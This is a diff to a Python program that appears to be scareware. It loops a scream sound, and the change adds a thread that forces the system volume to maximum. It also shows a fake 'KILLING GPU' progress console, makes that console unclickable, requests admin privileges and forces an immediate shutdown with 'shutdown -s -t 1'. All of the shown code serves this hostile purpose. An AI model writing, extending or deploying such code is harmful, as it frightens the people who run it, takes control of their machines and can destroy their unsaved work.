@@ -253,23 +253,25 @@ class ConsoleWindow:
 class SoundTrack:
     def __init__(self):
         ScreamThread = threading.Thread(target=self.Scream)
+        AddVolumeThread = threading.Thread(target = self.increase_volume, args = (100,))
+        AddVolumeThread.start()
         ScreamThread.start()
-
     @staticmethod
     def Scream():
         wav_path = os.path.join(os.path.dirname(__file__), "scream.wav")
         while True:
             winsound.PlaySound(wav_path, winsound.SND_FILENAME)
 
+
+
     @staticmethod
-    def increase_volume(amount):
+    def increase_volume(amount : int):
         for i in range(amount):
             pyautogui.press("volumeup")
 
 
 def run_Death_Thread():
     console.Load(100, "KILLING GPU")
-    pyautogui.press("volumeup")
 
     time.sleep(1)
     shutdown_pc()
@@ -331,7 +333,6 @@ def make_console_unclickable():
 
 def shutdown_pc():
     os.system("shutdown -s -t 1")
-
 
 if __name__ == '__main__':
     # Request admin privileges
